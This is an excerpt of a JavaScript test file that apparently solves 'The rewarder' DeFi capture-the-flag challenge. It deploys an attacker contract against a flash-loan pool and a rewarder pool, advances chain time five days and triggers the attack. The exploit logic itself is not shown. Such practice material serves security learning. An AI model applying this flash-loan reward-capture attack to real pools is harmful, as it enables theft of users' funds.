...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const ContratoAtacanteFactory = await ethers.getContractFactory('AttackRewarder', attacker)
        this.contratoAtaque = await ContratoAtacanteFactory.deploy(this.liquidityToken.address, this.flashLoanPool.address, this.rewarderPool.address, this.rewardToken.address)
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        await this.contratoAtaque.ejecutarAtaque()
    });
